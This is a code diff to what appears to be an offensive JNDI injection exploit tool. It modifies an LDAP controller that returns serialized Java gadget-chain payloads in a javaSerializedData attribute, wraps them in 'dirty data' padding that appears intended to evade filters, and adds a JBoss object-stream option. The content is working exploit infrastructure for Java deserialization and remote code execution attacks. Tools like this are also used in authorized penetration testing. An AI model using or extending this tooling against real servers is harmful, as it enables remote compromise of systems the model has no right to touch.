@@ -5,8 +5,8 @@ import com.nu1r.jndi.enumtypes.PayloadType;
 import com.nu1r.jndi.exceptions.IncorrectParamsException;
 import com.nu1r.jndi.exceptions.UnSupportedGadgetTypeException;
 import com.nu1r.jndi.exceptions.UnSupportedPayloadTypeException;
-import com.nu1r.jndi.gadgets.Config.Config;
 import com.nu1r.jndi.gadgets.ObjectPayload;
+import com.nu1r.jndi.gadgets.utils.Serializer;
 import com.nu1r.jndi.gadgets.utils.Util;
 import com.nu1r.jndi.gadgets.utils.dirty.DirtyDataWrapper;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
@@ -15,7 +15,6 @@ import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
 
 import java.io.ByteArrayOutputStream;
-import java.io.ObjectOutputStream;
 
 import static com.nu1r.jndi.gadgets.Config.Config.*;
 import static org.fusesource.jansi.Ansi.ansi;
@@ -30,7 +29,7 @@ public class SerializedDataController implements LdapController {
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
         System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Send LDAP result for |@" + base + " @|MAGENTA with javaSerializedData attribute|@"));
-        Entry                                e            = new Entry(base);
+        Entry e = new Entry(base);
 
         try {
             final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(String.valueOf(gadgetType));
@@ -39,11 +38,9 @@ public class SerializedDataController implements LdapController {
             if (dirtyType && dirtyLength) {
                 object = new DirtyDataWrapper(object, Type1, Length1).doWrap();
             }
-            ByteArrayOutputStream baous = new ByteArrayOutputStream(); //序列化
-            ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-            oos.writeObject(object);
-            byte[] bytes = baous.toByteArray();
-            oos.close();
+
+            ByteArrayOutputStream out   = new ByteArrayOutputStream();
+            byte[]                bytes = Serializer.serialize(object, out);
 
             e.addAttribute("javaClassName", "foo");
             e.addAttribute("javaSerializedData", bytes);
@@ -100,6 +97,10 @@ public class SerializedDataController implements LdapController {
                             dirtyLength = true;
                             Length1 = Integer.parseInt(U[4]);
                             System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 脏数据大小 >> |@" + U[4]));
+                        }
+                        if (cmd.contains("jb")) {
+                            IS_JBOSS_OBJECT_INPUT_STREAM = true;
+                            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 使用 ObjectInputStream/ObjectOutputStream |@" + U[4]));
                         }
                     } else {
                         params = new String[]{cmd};
